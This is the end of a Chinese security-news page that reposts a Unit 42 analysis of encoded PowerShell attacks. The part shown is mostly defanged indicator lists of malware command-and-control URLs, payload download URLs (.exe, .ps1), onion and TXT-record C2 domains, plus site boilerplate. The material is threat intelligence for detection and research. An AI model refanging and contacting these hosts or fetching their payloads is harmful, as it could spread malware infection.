1hxxps://45[.]63.109.205:8443/index.asp
1hxxps://172[.]30.18.11:443/index.asp
1hxxps://146[.]148.58.157:8088/index.asp
1hxxps://108[.]61.211.36/index.asp
1hxxps://107[.]170.132.24:443/index.asp
1hxxps://104[.]131.182.177:443/index.asp
1hxxp://sparta34[.]no-ip.biz:443/index.asp
1hxxp://securetx[.]ddns.net:3333/index.asp
1hxxp://pie32[.]mooo.com:8080/index.asp
1hxxp://m[.]jdirving.email:21/index.asp
1hxxp://kooks[.]ddns.net:4444:4444/index.asp
1hxxp://kernel32[.]ddns.net:8080/index.asp
1hxxp://home[.]rzepka.se/index.asp
1hxxp://192.ho4x.com:80/index.asp
1hxxp://ec2-35-167-185-55[.]us-west-2.compute.amazonaws.com:443/index.asp
1hxxp://amazonsdeliveries[.]com/index.asp
1hxxp://ahyses[.]ddns.net:4444/index.asp
1hxxp://98[.]103.103.170:80/index.asp
1hxxp://98[.]103.103.168:80/index.asp
1hxxp://93[.]187.43.200:80/index.asp
1hxxp://84[.]200.2.13:8080/index.asp
1hxxp://78[.]229.133.134:80/index.asp
1hxxp://68[.]66.9.76/index.asp
1hxxp://52[.]36.245.145:8080/index.asp
1hxxp://52[.]28.250.99:8080/index.asp
1hxxp://52[.]196.119.113:80/index.asp
1hxxp://50[.]251.57.67:8080/index.asp
1hxxp://47[.]88.17.109:80/index.asp
1hxxp://46[.]246.87.205/index.asp
1hxxp://41[.]230.232.65:5552:5552/index.asp
1hxxp://24[.]111.1.135:22/index.asp
1hxxp://23[.]116.90.9:80/index.asp
1hxxp://222[.]230.139.166:80/index.asp
1hxxp://197[.]85.191.186:80/index.asp
1hxxp://197[.]85.191.186:443/index.asp
1hxxp://192[.]241.129.69:443/index.asp
1hxxp://191[.]101.31.118:8081/index.asp
1hxxp://187[.]228.46.144:8888/index.asp
1hxxp://187[.]177.151.80:12345/index.asp
1hxxp://166[.]78.124.106:80/index.asp
1hxxp://163[.]172.151.90:80/index.asp
1hxxp://149[.]56.178.124:8080/index.asp
1hxxp://139[.]59.12.202:80/index.asp
1hxxp://138[.]121.170.12:500/index.asp
1hxxp://138[.]121.170.12:3138/index.asp
1hxxp://138[.]121.170.12:3137/index.asp
1hxxp://138[.]121.170.12:3136/index.asp
1hxxp://138[.]121.170.12:3135/index.asp
1hxxp://138[.]121.170.12:3133/index.asp
1hxxp://138[.]121.170.12:3031/index.asp
1hxxp://137[.]117.188.120:443/index.asp
1hxxp://11[.]79.40.53:80/index.asp
1hxxp://108[.]61.217.22:443/index.asp
1hxxp://104[.]233.102.23:8080/index.asp
1hxxp://104[.]145.225.3:8081/index.asp
1hxxp://104[.]131.154.119:8080/index.asp
1hxxp://104[.]130.51.215:80/index.asp
1hxxp://100[.]100.100.100:8080/index.asp
6.3&nbsp;Downloader&nbsp;DFSP&nbsp;2X
25hxxp://93[.]174.94.135/~kali/ketty.exe
19hxxp://94[.]102.52.13/~yahoo/stchost.exe
17hxxp://93[.]174.94.137/~rama/jusched.exe
17hxxp://94[.]102.52.13/~harvy/scvhost.exe
2hxxp://10[.]10.01.10/bahoo/stchost.exe
1hxxp://93[.]174.94.135/~harvy/verfgt.exe
6.4&nbsp;Downloader&nbsp;DFSP&nbsp;DPL
6hxxp://84[.]200.84.187/Google&nbsp;Update&nbsp;Check.html
2hxxp://52[.]183.79.94:80/TYBMkTfsQ
2hxxp://76[.]74.127.38/default-nco.html
2hxxp://pmlabs[.]net/cis/test.jpg
2hxxps://wowyy[.]ga/counter.php?c=pdfxpl+
1hxxp://192[.]168.137.241:8080/
1hxxp://91[.]120.23.152/wizz.txt
1hxxp://93[.]171.205.35:8080/
1hxxp://cannot[.]loginto.me/googlehelper.ps1
1hxxps://invesco[.]online/aaa
6.5&nbsp;Downloader&nbsp;IEXDS
6hxxp://84[.]200.84.187/Google&nbsp;Update&nbsp;Check.html
2hxxp://52[.]183.79.94:80/TYBMkTfsQ
2hxxp://76[.]74.127.38/default-nco.html
2hxxp://pmlabs[.]net/cis/test.jpg
2hxxps://wowyy[.]ga/counter.php?c=pdfxpl+
1hxxp://192[.]168.137.241:8080/
1hxxp://91[.]120.23.152/wizz.txt
1hxxp://93[.]171.205.35:8080/
1hxxp://cannot[.]loginto.me/googlehelper.ps1
1hxxps://invesco[.]online/aaa
6.6&nbsp;BITS&nbsp;Transfer
11hxxp://94[.]102.50.39/keyt.exe
6.7&nbsp;TXT&nbsp;C2
4l[.]ns.topbrains.pl
2p[.]s.os.ns.rankingplac.pl
1l[.]ns.huawel.ro
1p[.]s.pn.ns.sse.net.pl
1p[.]s.rk.ns.rankingplac.pl
1p[.]s.w2.ns.rankingplac.pl
6.8&nbsp;Downloader&nbsp;Proxy
7hxxp://54[.]213.195.138/s2.txt?u=
1hxxp://www[.]bcbs-arizona.org/s2.txt?u=
1hxxp://www[.]bcbsarizona.org/s2.txt?u=
6.9&nbsp;Downloader&nbsp;Kraken
5hxxp://kulup[.]isikun.edu.tr/Kraken.jpg
6.10&nbsp;PowerWorm
12hxxp://powerwormjqj42hu[.]onion/get.php?s=setup&amp;amp;mom=
7hxxp://powerwormjqj42hu[.]onion/get.php?s=setup&amp;amp;uid=
6.11&nbsp;AMSI&nbsp;Bypass
4hxxp://35[.]165.38.15:80/login/process.php
1hxxp://amazonsdeliveries[.]com:80/account/login.php
1hxxp://35[.]164.97.4:80/admin/get.php
1hxxp://162[.]253.133.189:443/login/process.php
1hxxp://162[.]253.133.189:443/admin/get.php
6.12&nbsp;Meterpreter&nbsp;RHTTP
1198[.]56.248.117
162[.]109.8.21
165[.]112.221.34
188[.]160.254.183
6.13&nbsp;Layer&nbsp;of&nbsp;Obfuscation
1hxxp://ec2-35-167-185-55[.]us-west-2.compute.amazonaws.com:8080/anSfrf
6.14&nbsp;SHA1&nbsp;Hashtag
1hxxp://212[.]83.186.207/?i=</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span><br/></p></p>
                <hr/>
                <p style="text-align: center;">
                    <img src="http://bobao.360.cn/img/app.jpeg"/>
                    <img src="http://bobao.360.cn/img/weixin.jpeg"/>
                </p>
                                <p>本文转载自 paloaltonetworks.com<br/><a class="text-more" href="http://researchcenter.paloaltonetworks.com/2017/03/unit42-pulling-back-the-curtains-on-encodedcommand-powershell-attacks/" target="_blank">原文链接：http://researchcenter.paloaltonetworks.com/2017/03/unit42-pulling-back-the-curtains-on-encodedcommand-powershell-attacks/</a></p>
                            </div>
            <div style="margin-top: 20px;background-color:#FFFFFF">
    <input type="hidden" id="detail_title" name="detail_title" value="【技术分享】揭开PowerShell编码攻击的神秘面纱 - 安全客 - 有思想的安全新媒体" />
    <input type="hidden" id="use_nickname" name="use_nickname" value="0" />
    <a name="mao"></a>
    <div class="reg-log mobile-hiden">
        <div class="" id="userTo">   
            <div id="to-list" class="input-text" style="">
                <textarea disabled="disabled" class="hide"  id="comment-content" to="to"></textarea>
                <ul id="preadded" style="display:none">       
                </ul>
                <div id="to-auto" style="width: 200px">
                    <ul id="feed">
                    </ul>
                </div>
            </div>
        </div>
        <input type="hidden" id="source-id" value="3630" />
        <input type="hidden" id="source-type" value="learning" />
        <input type="hidden" id="post-comment-url" value="/comment/add" />
        <input type="hidden" id="post-nickname-url-ajax" value="/comment/randnicknameajax" />
        <input type="hidden" id="post-check-login-url-ajax" value="/comment/checklogin" />
        <input type="hidden" id="stoken_comment_set" value="ea3898fb4df38673fdeb61c458234054">                 <span class="join">参与讨论，请先 <a href="javascript:;" class="comment-login">登录</a> | <a href="javascript:;" class="comment-reg">注册</a> |  <a href="javascript:;" class="anonymous-comment">匿名评论</a></span>
            </div>
    <div class="mobile-hide" style="width: 870px; margin: 0 auto;">
        <label style="vertical-align:middle;" for="use_nickname">匿名</label> 
        <input style="vertical-align:middle;" id="trigger-nickname" name="use_nickname" class="use_nickname" type="checkbox" value="0" />

        <a href="javascript:;" class="apply-use button" id="submit-comment" data-target="/comment/add">发布</a>
    </div>


    <div class="clearfix"></div>
    <div class="comments">
        <div class="comments-head">
            <span class="title">用户评论</span>
        </div>
                <div class="comment-none alarm-info bg-primary">无任何评论</div>
            </div>
</div>
<script>
    $(function () {
        $('.anonymous-comment').click(function () {
            $(".join").hide();
            $(".reg-log textarea").first().removeAttr("disabled").show();
            $('#use_nickname').val('1');
//            $('#trigger-nickname').attr('checked', true);
            $('#trigger-nickname').trigger('click');
        });
        //为所有复选框绑定事件
//        checkbox_on_click();
        //ajax随机获取昵称
//        randnicknameajax(0);
        //ajax检测登录状态
        comment_check_login();
    });



    function input_checkbox(flag) {
        $('input:checkbox').each(function () {
            var value = flag ? 1 : 0;
            $(this).prop('checked', flag);
            $(this).val(value);
        });
    }

//ajax随机获取昵称
    function randnicknameajax(flag) {
        $.ajax({
            type: 'POST',
            url: $('#post-nickname-url-ajax').val(),
            data: {limit: 1, flag: flag},
            dataType: "json",
            success: function (data) {
                $('#nick-name').val(data.data[0]);
                _nick_name=data.data[0];
            }
        });
    }
    $();
//ajax检测登录状态
    function comment_check_login() {
        $.ajax({
            type: 'POST',
            url: $('#post-check-login-url-ajax').val(),
            data: {},
            dataType: "json",
            success: function (data) {
                if (data.success) {
                    $('.join').hide();
                    $(".reg-log textarea").first().removeAttr("disabled").show();
                    $("#span_use_nickname").show();
                    $('#use_nickname').val('0');
                    $('#use_nickname').attr('checked', false);
                }
            }
        });
    }
</script>        </div>
    </div>
    <div class="side-bar">
        <div class="mod hot-news">
    <div class="head-bar clearfix">
        <h2><i class="icon icon-hot"></i><span>热门知识</span></h2>
    </div>
    <ul class="links-list">
                                <li><a href="/learning/detail/4411.html" alt="【漏洞预警】一个换行符引发的奥斯卡0day漏洞(CVE-2017-8759)重现——最新的Office高级威胁攻击预警" target="_blank">【漏洞预警】一个换行符引发的奥斯卡...</a></li>
                                <li><a href="/learning/detail/4416.html" alt="【漏洞预警】Microsoft .NET Framework漏洞（CVE–2017–8759）预警" target="_blank">【漏洞预警】Microsoft .NE...</a></li>
                                <li><a href="/learning/detail/4414.html" alt="【技术分享】妙用JavaScript绕过XSS过滤" target="_blank">【技术分享】妙用JavaScrip...</a></li>
                                <li><a href="/learning/detail/4418.html" alt="【技术分享】利用威胁情报数据平台拓展APT攻击线索一例" target="_blank">【技术分享】利用威胁情报数据平台拓...</a></li>
                                <li><a href="/learning/detail/4417.html" alt="【知识】9月15日 - 每日安全知识热点" target="_blank">【知识】9月15日 - 每日安全知识热...</a></li>
                                <li><a href="/learning/detail/4425.html" alt="【安全报告】XShellGhost事件技术回顾报告" target="_blank">【安全报告】XShellGhost事件...</a></li>
            </ul>
</div>        <!-- 友情链接 -->
        <div class="mod blog-links mobile-hide">
    <div class="head-bar clearfix">
        <h2><i class="icon icon-link"></i><span>友情链接</span></h2>
        <a href="/links/index.html" class="more">更多<i></i></a>
    </div>
        <ul class="links-list">
                <li><a href="http://bbs.360safe.com" alt="360安全社区" target="_blank">360安全社区</a></li>
                <li><a href="http://zhuji.360.cn" alt="360主机卫士" target="_blank">360主机卫士</a></li>
                <li><a href="http://blogs.360.cn/" alt="奇虎360技术博客" target="_blank">奇虎360技术博客</a></li>
                <li><a href="http://wangzhan.360.cn/" alt="360网站卫士" target="_blank">360网站卫士</a></li>
                <li><a href="http://webscan.360.cn/" alt="360网站安全检测" target="_blank">360网站安全检测</a></li>
                <li><a href="http://research.360.cn/report/" alt="360研究报告" target="_blank">360研究报告</a></li>
                <li><a href="http://unicorn.360.cn/" alt="360 Unicorn Team" target="_blank">360 Unicorn Team</a></li>
                <li><a href="http://appscan.360.cn/" alt="360捉虫猎手" target="_blank">360捉虫猎手</a></li>
                <li><a href="https://threathunter.org/" alt="ThreatHunter社区" target="_blank">ThreatHunter社区</a></li>
                <li><a href="http://security.360.cn/" alt="360安全应急响应中心" target="_blank">360安全应急响应中心</a></li>
            </ul>
    </div>
        <!-- 联系我们 -->
        <div class="mod contact mobile-hide" style="text-align:center">
    <div class="head-bar clearfix">
        <h2><i></i><span>关注我们</span></h2>
    </div>
    <!-- 微信关注 -->
    <ul class="contact-way">
        <li><a>微信关注</a></li>
    </ul>
    <div style="padding-left:20px;padding-bottom:15px;">
    <img src="/img/qrcode_adlab_weixin.png?v=1.1"  width="145px" height="145px;"/>
    </div>
    
    <!-- APP下载 -->
    <ul class="contact-way">
        <li><a>安全播报APP</a></li>
    </ul>
    <div style="padding-left:20px;padding-bottom:15px;">
    <img src="/img/scan_code_big.png?v=1.1"  width="145px" height="145px;"/>
    </div>
    
</div>

    </div>
</div>

<script type="text/javascript" src="/js/jquery-ui.min.js?v=3.0"></script>
<script type="text/javascript" src="/js/jquery.noty.packaged.min.js?v=3.0"></script>
<script type="text/javascript" src="/js/common.js?v=4.5"></script>
<script>$(function() {sync_count('comment');});</script>


<!-- 语法高亮 -->
<script type="text/javascript" src="/ue/SyntaxHighlighter/shCore.js"></script>
<script type="text/javascript">SyntaxHighlighter.all();sync_count('vul');sync_count('news');sync_count('learning');sync_count('activity');sync_count('course');sync_count('ctf');</script>
    </div>

        <div class="footer">
        <div class="friend-link">
            <a href="http://www.360.cn/" target="_blank">360首页</a>
            <span>|</span>
            <a href="/introduce/index" target="_blank">关于我们</a>
            <span>|</span>
            <a href="/introduce/index" target="_blank">联系我们</a>
            <span>|</span>
            <a href="/links/index.html" target="_blank">友情链接</a>
            <span>|</span>
            <a href="/introduce/index" target="_blank">招贤纳士</a>
        </div>
        <div class="copy">
            Copyright &copy; 360网络攻防实验室 All Rights Reserved <span class="copy_icp">京ICP证080047号[京ICP备08010314号-6]</span>
        </div>
    </div>
    
</div>

<!--奇舞团统计-->

<script src='https://s.ssl.qhimg.com/static/f5407c785655e6a1/monitor_analytic.js'></script>
<script>
    monitor.setProject('QH_171_1').getTrack().getClickAndKeydown().getClickHeatmap(10, 1);
</script>

<div class="hide">
    <script src="https://s95.cnzz.com/z_stat.php?id=1253147824&web_id=1253147824" language="JavaScript"></script>
</div>
<div class="backToTop_wrap off">
    <a id="back_to_top" class="backToTop" href="javascript:;" title="返回顶部"></a>
</div>
<script>
    var $backToTop_wrap = $(".backToTop_wrap"),
        $backToTop_btn = $("#back_to_top");

    if ($(window).scrollTop() > 100) {
        $backToTop_wrap.removeClass("off");
    }
    else {
        $backToTop_wrap.addClass("off");
    }

    $(window).on("scroll", function () {
        if ($(this).scrollTop() > 100) {
            $backToTop_wrap.removeClass("off");
        }
        else {
            $backToTop_wrap.addClass("off");
        }
    });

    $backToTop_btn.on("click", function () {
        $("html, body").animate({scrollTop: 0}, 120);
    });

    $(function () {
        var navlist = $('.nav-list > li');

        navlist.each(function () {
            $(this).on('mouseenter', function () {
                $(this).addClass('selected');
            });

            $(this).on('mouseleave', function () {
                $(this).removeClass('selected');
            });
        });
    })
</script>



</body>
</html>
